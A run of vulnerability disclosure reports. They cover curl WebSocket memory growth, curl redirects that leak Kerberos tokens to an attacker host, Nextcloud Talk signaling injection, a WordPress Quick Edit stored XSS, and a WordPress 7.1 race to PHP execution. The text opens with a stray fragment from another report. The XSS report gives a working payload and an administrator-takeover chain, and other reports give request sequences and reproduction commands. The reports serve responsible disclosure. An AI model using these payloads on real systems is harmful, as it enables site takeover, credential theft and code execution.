   What it is not — say it before they do: no memory corruption or code execution (I traced the state machine; eob only ranges 0→5, so the    POP3_EOB, prev writes stay inside the 5-byte static string), no credential exposure, no other user's mail, no write outside the -o   path the app chose, and no cascade — in my two-URL test message 2 still got its honest answer.

title: CVE-2026-11586 fix is incomplete: auto-PONG memory grows without limit through curl_ws_recv() (CONNECT_ONLY)

weakness.name: Allocation of Resources Without Limits or Throttling

vulnerability_information:
## Summary:
The CVE-2026-11586 fix (849317ff5c, "ws: make pong sending lazy") adds the automatic PONG only when the WebSocket send buffer has room, but it put that check in ws_flush() (lib/ws.c:1712). curl_ws_recv(), the receive call of the documented CONNECT_ONLY model, still calls ws_enc_add_pending() without it at the end of every call that returns a frame (lib/ws.c:1694-1698 in 8.23.0, unchanged in master). Once the server stops reading and the 128 KB send buffer is full, that call appends the 6-byte PONG for an empty PING (ws.c:973) and returns CURLE_AGAIN before it clears ws->pending, because ws_enc_write_payload() refuses even a 0-byte payload when the buffer is full (ws.c:1010), so the next call appends the same PONG again. From then on every frame the application receives adds 6 bytes that are neither sent nor freed while the server does not read, even if the server sends no more PINGs, which is the unbounded growth CVE-2026-11586 describes, reached through the other documented API. Against the same server, a CONNECT_ONLY client with default options kept growing until the end of every run on 8.23.0 and master on Linux, and on 8.23.0 and 8.21.0 natively on macOS (about 345 MB of heap in 30 seconds), while CURLWS_NOAUTOPONG, the 8.23.0 curl tool (callback mode, which the fix covers) and 8.23.0 with the fix below stayed flat. The call in curl_ws_recv() came with 0b09132877, the advisory's Introduced-in commit, and the fix's test (test_20_11_crazy_pings) runs the curl tool, so only the callback path was checked.

## Affected version
8.21.0 to 8.23.0 and master, which is every release with the CVE-2026-11586 fix. ws_enc_add_pending(), ws_enc_add_frame() and ws_enc_write_payload() are byte-identical in 8.21.0, 8.22.0 and 8.23.0, and all three end curl_ws_recv() with the unguarded call (39b06935be added `!ws->using_reader` to its condition in 8.23.0, but using_reader is never set in CONNECT_ONLY mode, ws.c:1469-1486). lib/ws.c and lib/bufq.c are unchanged from 8.23.0 to today's master 59d2537b40. Earlier versions are covered by CVE-2026-11586.

Tested with release builds (no sanitizers): on Linux, curl-8_23_0, curl-8_23_0 with the fix below, and master 629646d9b7 (same lib/ws.c and lib/bufq.c as 59d2537b40), with OpenSSL in a Debian 12 container over TCP on 127.0.0.1 (amd64 under emulation on an Apple silicon Mac); natively on macOS 27.0.1, curl-8_23_0 and curl-8_21_0 over a Unix socket.

```
curl 8.23.0-DEV (Linux) libcurl/8.23.0-DEV OpenSSL/3.0.22 zlib/1.2.13
curl 8.23.1-DEV (Linux) libcurl/8.23.1-DEV OpenSSL/3.0.22 zlib/1.2.13   (master 629646d9b7)
curl 8.23.0-DEV (Darwin) libcurl/8.23.0-DEV OpenSSL/3.6.4 zlib/1.2.12
curl 8.21.0-DEV (Darwin) libcurl/8.21.0-DEV zlib/1.2.12 mit-krb5/1.22.2
```

## Steps To Reproduce:
Linux with glibc 2.33 or later (the client uses mallinfo2()), everything on 127.0.0.1, files from the attached zip; linux/*.sh have the exact commands behind the numbers below.

1. Build a static libcurl without optional dependencies, so the client links with OpenSSL and zlib only: `cmake -S curl -B build -DCMAKE_BUILD_TYPE=Release -DCURL_USE_OPENSSL=ON -DBUILD_SHARED_LIBS=OFF -DBUILD_TESTING=OFF -DBUILD_EXAMPLES=OFF -DBUILD_LIBCURL_DOCS=OFF -DBUILD_MISC_DOCS=OFF -DCURL_USE_LIBPSL=OFF -DUSE_LIBIDN2=OFF -DCURL_USE_LIBSSH2=OFF -DUSE_NGHTTP2=OFF -DCURL_BROTLI=OFF -DCURL_ZSTD=OFF -DCURL_DISABLE_LDAP=ON && cmake --build build`
2. `cc -O2 poc/ws_recv_client.c -Icurl/include build/lib/libcurl.a -lssl -lcrypto -lz -lpthread -o ws_recv_client`. A plain CONNECT_ONLY client: curl_ws_recv() in a loop with poll() on CURLE_AGAIN, as curl_ws_recv(3) says. It never sends anything itself and prints RSS and heap in use every second.
3. `python3 poc/ws_noread_server.py 25001 185 &`. The server completes the handshake, never reads again, and sends empty PING and empty TEXT frames.
4. `./ws_recv_client ws://127.0.0.1:25001/ 180`. At first the PONGs only fill the TCP send path (about 30 seconds in my emulated container); after that heap and RSS grow by about 6 bytes per frame until the end.
5. Controls, each against a fresh server: `./ws_recv_client ws://127.0.0.1:25002/ 150 noautopong` and the curl tool, `build/src/curl -s -o /dev/null ws://127.0.0.1:25003/`. Both stay flat.

On macOS the same two files work over a Unix socket, where the growth starts at once: `python3 poc/ws_noread_server.py /tmp/ws.sock 35 &` and `UNIX_SOCKET=/tmp/ws.sock ./ws_recv_client ws://localhost/ 30` (link line in macos/run_macos.sh).

Linux, TCP, same server:

| run | frames returned | heap in use | RSS | growth per frame |
|---|---|---|---|---|
| 8.23.0, default options, 180 s | 14.2 million | 0.4 to 79.7 MB | 17.8 to 98.8 MB | 6.0 bytes |
| master, default options, 150 s | 12.3 million | 0.4 to 68.5 MB | 17.6 to 87.2 MB | 6.0 bytes |
| 8.23.0, only empty TEXT frames after 40 s, 210 s | 10.4 million | 0.4 to 52.6 MB | 17.5 to 70.7 MB | 6.0 bytes per 2-byte frame |
| 8.23.0, CURLWS_NOAUTOPONG, 150 s | 250.9 million (PINGs included) | 0.3 to 8.6 MB, no trend | 16.8 to 25.5 MB, flat after 68 s | none |
| 8.23.0 curl tool, 150 s | | | 18.1 to 18.3 MB | none |
| 8.23.0 with the fix below, 150 s | 24.3 million | 0.4 to 10.2 MB, no trend | 16.6 to 26.5 MB, flat after 34 s | none |

Natively on macOS (Unix socket, 30 s each, about 1.6 million frames per second), 8.23.0 went from 0.7 to 343.4 MB of heap and 8.21.0 from 0.3 to 346.0 MB, while CURLWS_NOAUTOPONG stayed at 0.6 MB and the curl tool peaked at a 2.9 MB footprint; there it is 7.5 bytes of heap per frame, because malloc rounds each 65,575-byte buffer chunk up to 80 KB. In every Linux run, the controls included, heap in use also jumps by up to about 10 MB and falls back, because curl_ws_recv() reads the socket backlog into its receive buffer in one call; the growth per frame is measured between those low points (README.txt).

Raw output in evidence/: 01b-linux-tcp-long.txt (8.23.0, master), 05-linux-tcp-text-only.txt, 04-linux-tcp-controls-150s.txt (CURLWS_NOAUTOPONG, curl tool), 02-fix-check.txt (fix) and 03-macos-unix-socket.txt (macOS).

## Fix
In curl_ws_recv(), call ws_flush() instead of ws_enc_add_pending(): ws_flush() adds the pending PONG only when the send buffer has room, as the CVE-2026-11586 fix intended (fix/ws-recv-pong-guard.diff applies to 8.23.0 and master; 02-fix-check.txt is 8.23.0 with it).

AI disclosure: I used an AI assistant (Claude) for code review, test setup and drafting. I reproduced every result myself on curl built from the curl-8_23_0 and curl-8_21_0 tags and from master, on Linux and macOS; the attached logs are the raw output.

## Impact

A malicious WebSocket server can make any libcurl application that uses the documented CONNECT_ONLY model (curl_ws_recv()) with default options keep allocating memory, without limit, for as long as the connection is open, which is what the CVE-2026-11586 fix was meant to stop. The server completes a normal handshake, stops reading and sends small frames: once the TCP send path is full, every frame the application receives costs 6 bytes that stay allocated, three times the 2 bytes of an empty TEXT frame, and after the first stuck PONG the server does not need to send any more PINGs. The growth only depends on how many frames the server sends and the application reads; natively on macOS that was about 345 MB in 30 seconds. In #3788931 jimfuller2024 named long-lived libcurl applications with WebSocket connections to untrusted peers, such as services that proxy or aggregate WebSocket feeds, as the main concern; when they use curl_ws_recv(), the fix does not protect them. The curl tool is not affected because it uses the callback model that the fix covers, and CURLWS_NOAUTOPONG avoids the problem.

title: Redirect to imap/pop3/smtp (SASL) or sftp/scp (libssh) authenticates to the attacker's host with the user's ambient Kerberos credentials
vulnerability_information:
## Summary:
When curl follows a redirect to an IMAP, POP3 or SMTP URL carrying any userinfo (`imap://@attacker.example/` is enough), it authenticates to the redirect target with SASL GSSAPI out of the user's default Kerberos credential cache, although no credentials and no authentication method were configured. url_set_data_creds() gates *option* credentials on the origin (`Curl_auth_allowed_to_origin()`, lib/url.c:1376-1381) but merges the redirect URL's own userinfo in unconditionally as CREDS_URL (:1432-1433); that creds object alone makes Curl_sasl_can_authenticate() true (lib/curl_sasl.c:277); sasl_choose_krb5() then picks GSSAPI with no origin check at all (:315-341), because Curl_auth_user_contains_domain() treats an empty user name as valid under GSS-API or SSPI ("User and domain are obtained from the GSS-API credentials cache or the currently logged in user from Windows", lib/vauth/vauth.c:126-131), and the ticket is minted with GSS_C_NO_CREDENTIAL, the default ccache (lib/vauth/krb5_gssapi.c:140). The clearest way to see it is to compare two releases: on 8.22.0 `curl --negotiate -u : -L` redirected to `http://:@b.test/` sends `Authorization: Negotiate` to that host and on 8.23.0 it sends none, because 557a52f21e (CVE-2026-94265) and 43029e2ec3 (CVE-2026-86413) fixed it, while the imap, pop3 and smtp rows below are identical on both. Those two fixes only touched lib/http.c and the HTTP connection matching in lib/url.c, although 557a52f21e states the intent as "Restrict Negotiate/NTLM to only "allowed" origins, irregardless of where credentials are sourced from"; neither the SASL code nor the libssh code calls Curl_auth_allowed_to_host() or Curl_auth_allowed_to_origin(), which is what the attached fix adds. On libssh builds a redirect to `sftp://` or `scp://` does the same over gssapi-with-mic and needs no userinfo: myssh_in_AUTHLIST() goes to SSH_AUTH_GSSAPI whenever the server offers it (lib/vssh/libssh.c:842-843), myssh_in_AUTH_GSSAPI() calls ssh_userauth_gssapi() (:928-947), and the only gate is CURLSSH_AUTH_GSSAPI, which the default CURLSSH_AUTH_ANY includes (url.c:375, curl.h:863-871). With CURLOPT_GSSAPI_DELEGATION / `--delegation always`, or `GSSAPIDelegateCredentials yes` in ssh_config for libssh, the forwarded token carries the user's TGT.

## Affected version
Tested affected: 8.17.0, 8.21.0, 8.22.0, 8.23.0, master 59d2537b40, Homebrew 8.22.0 and the macOS system /usr/bin/curl 8.7.1. The `imap://u%40d@host/` form (any user name containing `@`, `\` or `/`) was accepted by every version I tested. The empty-userinfo form was accepted by all of them except 8.20.0, where 425a2aa1af's `data->conn->user[0]` check happened to block it, and also broke the user's own ambient-credential transfers, until the 8.21.0 credentials rework 8f71d0fde5 made a creds object non-NULL for an empty user again; by those commits the gap should start at 8.18.0, but 8.20.0 is the only release in it I built. SASL GSSAPI exists since 7.40.0 (018b9d421a) and the libssh GSSAPI path since 7.58.0 (c92d2e14cf); I did not build those. The mail protocols affect libcurl and the curl tool. For SSH it is libcurl applications that leave CURLOPT_SSH_KNOWNHOSTS unset, which is the libcurl default, or that accept new host keys; the curl tool is not exposed since 8.23.0, because the CVE-2026-86410 fix 6ae9befb2f sets the SSH options on redirects as well and falls back to `$HOME/.ssh/known_hosts` even with no `--knownhosts` (src/config2setopts.c:238-254), so the attacker's host key is refused before authentication. macOS 27.0.1 arm64, MIT krb5 1.22.2, libssh 0.12.0.

## Steps To Reproduce:
Everything runs on 127.0.0.1. The scripts build a throwaway MIT realm in `./krb` with their own KRB5_CONFIG, KRB5CCNAME and KRB5_KDC_PROFILE, so the host's Kerberos setup, the real `~/.ssh` and the real ccache are untouched; host names are mapped with `--resolve`.

1. `./setup_kdc.sh` creates realm CREDS.TEST, the victim `alice`, the attacker's service keys `imap|pop|smtp|HTTP|host/b.test` in `krb/b.keytab`, and builds `gssaccept`, which validates a captured token against that keytab.
2. `CURL=/path/to/curl ./run_sasl_gssapi_poc.sh` starts the KDC, runs `kinit alice`, starts `srv.py` (answers `302 Location: imap://@b.test:21105/`) and `imapsrv.py` (offers only AUTH=GSSAPI and logs the token), then runs with no authentication options at all:
   `curl -L --proto-redir =http,https,imap --resolve a.test:21101:127.0.0.1 --resolve b.test:21105:127.0.0.1 'http://a.test:21101/x?code=302&loc=imap://@b.test:21105/'`
   and prints what `gssaccept` makes of the token. It then repeats this for pop3 and smtp, for the `imap://u%40d@b.test/` form, with `--delegation always`, and for the reference, mitigation and opt-in cases.
3. `./build.sh [curl build dir] && ./run_libcurl_poc.sh` does the same from a libcurl application that sets only CURLOPT_FOLLOWLOCATION and CURLOPT_REDIR_PROTOCOLS_STR `"http,https,imap"`.
4. `cd libssh && ./build.sh <curl build dir with -DCURL_USE_LIBSSH=ON> && ./run_libssh_poc.sh` builds the application, `evilsshd` and its host key, and follows `302 Location: sftp://b.test:23220/some/file`.
5. The realm lives entirely in `./krb`; delete that directory to clean up.

"ACCEPTED" means `gssaccept` validated the captured token against the attacker's keytab as `alice@CREDS.TEST`. Evidence 01 and 02 for SASL, 03 for SSH, 04 for the release range.

| version | imap `@` | pop3 `@` | smtp `@` | imap `u%40d@` | `@` + --delegation | own direct transfer |
|---|---|---|---|---|---|---|
| 8.17.0 | **ACCEPTED** | **ACCEPTED** | **ACCEPTED** | **ACCEPTED** | **ACCEPTED + TGT** | ACCEPTED |
| 8.20.0 | no token | no token | no token | **ACCEPTED** | no token | no token |
| 8.21.0 / 8.22.0 / 8.23.0 / master | **ACCEPTED** | **ACCEPTED** | **ACCEPTED** | **ACCEPTED** | **ACCEPTED + TGT** | ACCEPTED |
| Homebrew 8.22.0, macOS 8.7.1 | **ACCEPTED** | **ACCEPTED** | **ACCEPTED** | **ACCEPTED** | **ACCEPTED + TGT** | ACCEPTED |
| master + attached fix | no token | no token | no token | no token | no token | ACCEPTED |

| libssh backend, 8.23.0 and master | result |
|---|---|
| 302 to `sftp://` and to `scp://` | **ACCEPTED** (965 b), local login name sent as the SSH user |
| same, `GSSAPIDelegateCredentials yes` | **ACCEPTED** (1733 b) + DELEGATED TGT |
| master + attached fix | no gssapi attempt; own direct `sftp://` still ACCEPTED |
| only http,https in redirects | CURLE_UNSUPPORTED_PROTOCOL |
| no Kerberos ticket | no gssapi attempt |
| the curl tool, same redirect | exit 60, host key refused first, 0 tokens (CVE-2026-86410 fix) |

HTTP control, same script: 8.22.0 sends `Authorization: Negotiate` to the redirect target, 8.23.0 and master send none. Mitigation `--disallow-username-in-url`: no token, both Location forms, every affected build. Opt-in `--location-trusted`: authenticates, before and after the fix.

## Fix
fix/sasl-libssh-gssapi-allowed-origin.diff (against master 59d2537b40) requires `Curl_auth_allowed_to_host()` before the ambient Kerberos identity is used, in sasl_choose_krb5() for the mail protocols and in myssh_in_AUTH_GSSAPI() for libssh, which is the rule 557a52f21e applied to HTTP. Built and re-run on all three builds (evidence 01, 02, 03): no token reaches any redirect target, the user's own direct transfers still authenticate, and `--location-trusted` still works. One side effect: for the mail protocols SASL then falls back to a plain `LOGIN` carrying the Location's own (empty or attacker-chosen) user name and no password, so nothing secret is sent but the exchange is no longer identical.

The two halves are independent: the SASL finding needs no libssh, and the diff patches the two call sites separately. If you would rather track the SSH half as its own report, say so and I will file it separately rather than have it hold up the mail protocols.

AI disclosure: I used an AI assistant (Claude) for code review, test setup and drafting. Every row above was produced by the attached scripts on my own machine and the zip holds the raw logs. Before filing I re-ran the SASL matrix myself on two binaries, a curl-8_23_0 build and the macOS system `/usr/bin/curl` 8.7.1 as shipped, covering the HTTP control, imap/pop3/smtp, the `u%40d@` form, `--delegation always`, both `--disallow-username-in-url` cases and `--location-trusted`; both matched their rows above.

## Impact

A malicious HTTP server, or anyone who can answer one plaintext HTTP request, makes curl mint a Kerberos AP-REQ for a service and host the attacker picks (`imap|pop|smtp|host/<their host>`) out of the user's ambient identity, with no credentials, no Kerberos options and no authentication method set by the user. If the attacker owns that service principal, which any Active Directory domain user can arrange by default since machine accounts may be created with SPNs, they learn the user's identity and the session key; SASL GSSAPI has no channel binding here, so an attacker who can also intercept the connection to a real mail server can relay the token to it. With `--delegation always`, or `GSSAPIDelegateCredentials yes` for libssh, the forwarded ticket is the user's TGT, which is full impersonation in the realm for its lifetime. The conditions match CVE-2026-86413 and CVE-2026-94265 (both Low) with the mail protocols in place of HTTP, except that those needed a first transfer "doing Negotiate authentication" and this needs no authentication option at all. Redirects have to allow imap, pop3, smtp, sftp or scp, which is not the default: the same precondition CVE-2025-14524 called "A highly unusual combination" before it was given a CVE at Low. `--disallow-username-in-url` blocks the mail half, and Fedora and RHEL ship the libssh backend.

title: Cross-room signaling injection enabling unauthorized force-mute
vulnerability_information:
## Summary:
A low-privileged participant can read another participant's live Talk `sessionId` from the room participant list, then use moderator rights in an unrelated room they control to inject moderator-only internal-signaling `control` messages into the victim's room session.

The server checks moderator permissions only against the sender session's own room, but it queues the message to any attacker-supplied recipient `sessionId`. Message delivery is then keyed only by recipient session ID, not by room. I reproduced this by sending a `forceMute` control from room B into a victim active in room A.

When the victim is in a call, the shipped client handles `forceMute` by muting the local user session.

## Product / Version

- Nextcloud Server: `34.0.0.1` (`status.php` reported `versionstring: 34.0.0 dev`)
- Talk app: `24.0.0-dev.2`
- `spreed` commit: `031e0708bde280b2a83943a0e7a6102d8eede207`
- Server commit used in the lab: `b71661a38bb40fbdfc071f273ea506a4a9fae091`
- Reproduced with the default internal-signaling mode on a local Nextcloud lab

## Affected Code

- `lib/Controller/RoomController.php:1217-1220`
  Active participant session IDs are exposed in the participant list.
- `lib/Controller/RoomController.php:1250-1253`
  Single-session participants are returned with `sessionIds`.
- `lib/Controller/SignalingController.php:387-418`
  `control` messages are authorized against the sender's session, then queued to arbitrary `decodedMessage['to']`.
- `lib/Signaling/Messages.php:48-56`
  Queue entries store `sender`, `recipient`, and `message` only.
- `lib/Signaling/Messages.php:102-110`
  Messages are fetched solely by `recipient = $sessionId`.
- `lib/Controller/SignalingController.php:551-585`
  Victim polling consumes any queued message for that session.
- `src/utils/webrtc/simplewebrtc/simplewebrtc.js:108-113`
  Incoming `forceMute` causes the client to mute itself when `peerId` matches the current session.

## Steps To Reproduce:

Preconditions:
- Victim and attacker both participate in room A.
- Attacker is only a normal participant in room A.
- Attacker owns or moderates unrelated room B.
- Internal signaling is enabled.

Steps:

  1. On nextcloud  spreed (34.0.0.1 / Talk 24.0.0-dev.2), `victim` created room A and added `attacker` (evil). Both joined room A.
     evil queried GET /ocs/v2.php/apps/spreed/api/v4/room/97oqymwq/participants?format=json and received victim’s live room-A session ID JRal9O65....
  2. evil created unrelated room B, joined it, and got room-B sender session pekgCNiV....
  3. evil sent this to room B:

     {
       "messages": "[{\"ev\":\"message\",\"sessionId\":\"<evil_room_b_session>\",\"fn\":\"{\\\"type\\\":\\\"control\\\",\\\"to\\\":\\\"<victim_room_a_session>\\\",\\\"payload\\\":{\\\"action\\\":\\\"forceMute\\\",\\\"peerId\\\":\\\"<victim_room_a_session>\\\"}}\"}]"
     }
     to POST /ocs/v2.php/apps/spreed/api/v3/signaling/pfo7kdcz?format=json
  4. Server-side evidence showed a queued row with sender pekgCNiV... and recipient JRal9O65... in oc_talk_internalsignaling.
  5. victim then polled room A with GET /ocs/v2.php/apps/spreed/api/v3/signaling/97oqymwq?format=json and received the injected control message with "from":"pekgCNiV...".
  6. Negative control: sending the same forceMute from room A itself, using evil’s room-A session QBL3zUuH..., created no victim-targeted queue row and victim’s next poll returned only usersInRoom.


## Supporting Material/References:

Here the attacker reads the session of the victim in the shared room
{F5634941}

the attacker uses the victim's session as the recipient and the attackers room B as the sender
{F5634940}

victim in room A receives injected message from attacker in room B and is muted 
{F5634942}

## Impact

- A low-privileged user can inject moderator-only internal-signaling controls into a room they do not moderate.
- The reproduced payload is `forceMute`. When the victim is in a call, the shipped client handles this by muting the local session.
- More generally, the room boundary for internal signaling is broken because delivery is keyed only by recipient session ID.

title: Large-site Quick Edit reparses a Contributor display name into active HTML
vulnerability_information: On sites with more than 10,000 users, a Contributor can save entity-encoded HTML in their display name. When an administrator opens the attacker's crafted Posts-page URL and clicks **Quick Edit** on the Contributor's pending post, WordPress decodes the stored name with `.text()` and reparses it through jQuery `.prepend()`, causing stored DOM XSS. ## Affected Asset - WordPress Core 7.0.2 - `wp-admin/js/inline-edit-post.js` - Posts list Quick Edit fallback for large user counts ## Preconditions - The site has more than 10,000 users, or `wp_is_large_user_count()` is otherwise forced true. - The attacker has a Contributor account and owns a pending post. - The administrator opens an attacker-supplied Posts-page URL containing the second-stage fragment. - A user with `edit_others_posts` clicks **Quick Edit** on that post. - At exactly 10,000 users, the normal populated author dropdown prevents this branch. ## Docker Setup Save this as `compose.yml`: ```yaml name: wp-quick-edit-large-site-lab services: db: image: mysql:8.4 environment: MYSQL_DATABASE: wordpress_quick_edit MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress MYSQL_ROOT_PASSWORD: root healthcheck: test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "-proot"] interval: 3s timeout: 3s retries: 30 volumes: - quick_edit_db_data:/var/lib/mysql wordpress: image: wordpress:7.0.2-php8.3-apache depends_on: db: condition: service_healthy ports: - "8097:80" environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_NAME: wordpress_quick_edit WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress volumes: - quick_edit_wp_data:/var/www/html cli: image: wordpress:cli-php8.3 depends_on: db: condition: service_healthy wordpress: condition: service_started user: "33:33" environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_NAME: wordpress_quick_edit WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress entrypoint: ["/bin/sh", "-c"] command: - | until [ -f /var/www/html/wp-config.php ] && wp core version >/dev/null 2>&1; do sleep 2; done if ! wp core is-installed >/dev/null 2>&1; then until wp core install --url=http://127.0.0.1:8097 --title='Large Site Quick Edit Lab' --admin_user=admin --admin_password='Admin-Test-9482' --admin_email=admin@example.test --skip-email; do sleep 2; done fi if ! wp user get contributor >/dev/null 2>&1; then wp user create contributor contributor@example.test --role=contributor --user_pass='Contributor-Test-9482' fi wp option update user_count 10001 wp rewrite structure '/%postname%/' --hard volumes: - quick_edit_wp_data:/var/www/html volumes: quick_edit_db_data: quick_edit_wp_data: ``` The `user_count` option models an already-large deployment without creating 10,001 dummy accounts. Start it: ```bash docker compose up -d docker compose logs -f cli ``` Continue after `cli` exits with code `0`. ## Steps To Reproduce 1. Log in at `http://127.0.0.1:8097/wp-admin/` as: ```text Username: contributor Password: Contributor-Test-9482 ``` 2. Open the dashboard console and update the Contributor's own display name: ```javascript const nonce = await fetch(`/wp-admin/admin-ajax.php?action=rest-nonce`).then(r => r.text()); const me = await fetch(`/index.php?rest_route=/wp/v2/users/me&context=edit`, { headers: { "X-WP-Nonce": nonce } }).then(r => r.json()); await fetch(`/index.php?rest_route=/wp/v2/users/${me.id}`, { method: `POST`, headers: { "Content-Type": `application/json`, "X-WP-Nonce": nonce }, body: JSON.stringify({ name: `<img src=x onerror=eval(atob(location.hash.slice(1)))>` }) }); ``` 3. Create any post and click **Submit for Review**. 4. The Contributor sends the administrator this crafted URL. The fragment contains only a harmless title-change marker: ```text http://127.0.0.1:8097/wp-admin/edit.php?post_status=pending&post_type=post#ZG9jdW1lbnQudGl0bGU9J1F1aWNrLUVkaXQtWFNTLTcyMSc= ``` 5. In a separate browser profile, log in as: ```text Username: admin Password: Admin-Test-9482 ``` 6. While authenticated, open the crafted URL from step 4. Do not run anything in the administrator's console. 7. Click **Quick Edit** under the Contributor's post. The browser tab title changes to `Quick-Edit-XSS-721`, confirming execution. Before this click, the author cell contains only text and no active image. 8. To confirm administrator takeover, open this second attacker-supplied URL and click **Quick Edit** on the same post: ```text http://127.0.0.1:8097/wp-admin/edit.php?post_status=pending&post_type=post# ``` The administrator performs no console action. After the Quick Edit click, **Users** contains: ```text Username: h1-quick-edit-admin Password: H1-Quick-Edit-9482! Role: Administrator ``` ## Confirmed Result - WordPress version: 7.0.2 - Contributor self-profile update: HTTP 200 - Pending-post creation: HTTP 201 - Quick Edit author select: `hidden`, zero options - Before Quick Edit: zero active elements - After Quick Edit: tab title `Quick-Edit-XSS-721`, one active element - Takeover requests: GET 200 and POST 302 to `/wp-admin/user-new.php` - Created account role: `administrator` - Temporary automated validation data was removed. ## Root Cause - WordPress preserves valid entities such as `<` in the saved display name. - The Posts list initially renders that value safely as text. - In large-site mode, Quick Edit omits the normal author options. - The fallback reads the author cell through `.text()` and concatenates it into HTML passed to `.prepend()`. - The decoded `` is therefore parsed as a live element. ## Impact - Contributor-controlled JavaScript runs after the administrator opens the crafted link and clicks Quick Edit. - The script can read nonces and perform administrator-only same-origin actions. - The confirmed chain creates a persistent Administrator account.

title: WordPress 7.1 Media Processing Race Enables Persistent PHP File Write and Author-to-RCE
vulnerability_information:
Hi Wordpress security team,

We are submitting this report in good faith and in the best interest of preventing this issue from shipping in the upcoming WordPress 7.1 release. 

The vulnerability is not present on the current WordPress 7.0 branch (7.0.3), , while we have confirmed it in the WordPress 7.1 development line from Beta 2 through the current development source build we tested (7.1-RC2-63095-src).

WordPress 7.1 is currently scheduled for release on August 19, 2026. We are therefore reporting this before the final release so the issue can be reviewed before it reaches stable users.

If issues affecting pre-release/development versions are considered outside the scope of the HackerOne program, we respectfully ask that you allow us to withdraw/close the report from our side rather than resolving it as N/A.

### Pre-condition 
For the demonstrated direct-HTTP execution path, WordPress's selected temporary directory must be located under a PHP-served path.

If `/tmp` is **not writable** by the user running PHP, WordPress can fall back to another writable temporary directory. In our Docker reproduction, making `/tmp` non-writable for the PHP user causes WordPress to fall back to the `wp-content` directory.

We simulate this condition in Docker by making `/tmp` writable only by `root`.

One deployment scenario where this condition can occur is a containerized environment using `readOnlyRootFilesystem`, depending on how `/tmp` is mounted and configured. If `/tmp` is not provided as a writable `tmpfs`/`emptyDir` for the web/PHP user, WordPress may select another writable fallback directory.

### Vulnerability 

Under the validated preconditions, an authenticated user with the default Author role can exploit a race condition to achieve persistent arbitrary PHP execution.

By combining the media finalization, URL-media sideload, and image post-processing flows, the attacker can cause WordPress/Imagick to generate persistent image files with a .php extension while the image XMP metadata contains valid PHP code.

The race condition leading to RCE involves three REST actions in addition to the initial image upload.

**Step 1**

First, an image is uploaded using:

```http
POST /wp-json/wp/v2/media?generate_sub_sizes=false
```

**Step 2**

Call:

```http
POST /wp-json/wp/v2/media/{id}/finalize
```

This poisons the seed attachment metadata so `original_image` points to the attacker-chosen temporary `.php` path.

**Step 3**

Call:

```http
POST /wp-json/wp/v2/media
```

with the `url` parameter.

This causes WordPress to fetch the attacker-controlled JPEG. A remote `Content-Disposition` header causes the predictable `.php` basename to temporarily exist in WordPress's selected temporary directory.

Race the above request with:

```http
POST /wp-json/wp/v2/media/{id}/post-process?action=create-image-subsizes
```

The `/post-process` request races image processing against the temporary `.php` JPEG. When the race succeeds, Imagick opens the file as an image and WordPress generates persistent `.php` image derivatives.


### Vulnerable Version

Affected: WordPress `7.1-RC2-63095-src` — confirmed

Also reproduced in the WordPress 7.1 development line beginning with Beta 2.

Not affected: current WordPress 7.0 branch (`7.0.3-src`) in our testing.


###  Root cause of vulnerability : 

1) `/wp-json/wp/v2/media` - the URL-media flow downloads an attacker-controlled remote image through `download_url()`. `download_url()` honors the remote `Content-Disposition: attachment; filename=malicious.php` value and renames the local temporary file to that attacker-influenced basename, allowing a valid image to briefly exist with an executable extension such as `.php`. 

    [URL-media calls download_url() — lines 625–638](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php#L634-L640)

2) `/wp-json/wp/v2/media/{seed_id}/post-process?action=create-image-subsizes` races against the temporary file and invokes `wp_update_image_subsizes()` - which obtains the original-image path from attachment metadata and passes it into the image editor. 

    [Original path consumed for sub-size generation ](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-admin/includes/image.php#L159-L162) If the extension does not identify a known MIME type, `wp_get_image_editor()` deliberately allows the selected image editor to determine the format from the file contents instead of rejecting it based on extension. The derivative filename generator reuses the source extension when no replacement extension is supplied, allowing `.php` to propagate into generated sub-size filenames. 

    [Derivative extension reuse](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-includes/class-wp-image-editor.php#L435-L461) 

3) `/wp-json/wp/v2/media/{id}/finalize` allows attacker-controlled filename/path metadata to be persisted and later treated as a trusted local image path. The route accepts `file` and `original_image` as unrestricted strings, and `finalize_item()` directly assigns the supplied `original_image` into attachment metadata without sufficient validation. 

    [Finalize route schema](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php#L211-L212) 
    
    [Direct original_image metadata assignment](https://github.com/WordPress/wordpress-develop/blob/3ca084eb3399222a08cc0573278eed6be0f80714/src/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php#L2937-L2942) 


---
### Steps to Reproduce 

1. Clone the WordPress development repository and check out the exact tested source revision:

   ```bash
   git clone https://github.com/WordPress/wordpress-develop.git
   cd wordpress-develop
   git checkout 3ca084eb3399222a08cc0573278eed6be0f80714
   ```

   Verify the version in:

   ```text
   wordpress-develop/src/wp-includes/version.php
   ```

   Expected version:

   ```text
   7.1-RC2-63095-src
   ```

   WP version bump commit:

   https://github.com/WordPress/wordpress-develop/commit/3ca084eb3399222a08cc0573278eed6be0f80714

2. Install dependencies:

   ```bash
   npm install
   ```

3. Build WordPress:

   ```bash
   npm run build:dev
   ```

4. Start the Docker environment:

   ```bash
   npm run env:start
   ```

5. Install WordPress:

   ```bash
   npm run env:install
   ```

6. Create an Author user:

   ```bash
   npm run env:cli -- user create attacker attacker@example.com \
     --role=author \
     --user_pass='Password123!'
   ```

7. Verify the user was created:

   ```bash
   npm run env:cli -- user list
   ```

8. Make `/tmp` non-writable for non-root users:

   ```bash
   docker exec -u root wordpress-develop-php-1 chmod 755 /tmp
   ```

9. Verify the `/tmp` permissions:

   ```bash
   docker exec -u root wordpress-develop-php-1 ls -ld /tmp
   ```

   Expected permissions should resemble:

   ```text
   drwxr-xr-x
   ```

10. From the directory containing the reproducer, run:

    ```bash
    python3 race_poc.py
    ```

    The PoC uses the crafted image payload hosted at:
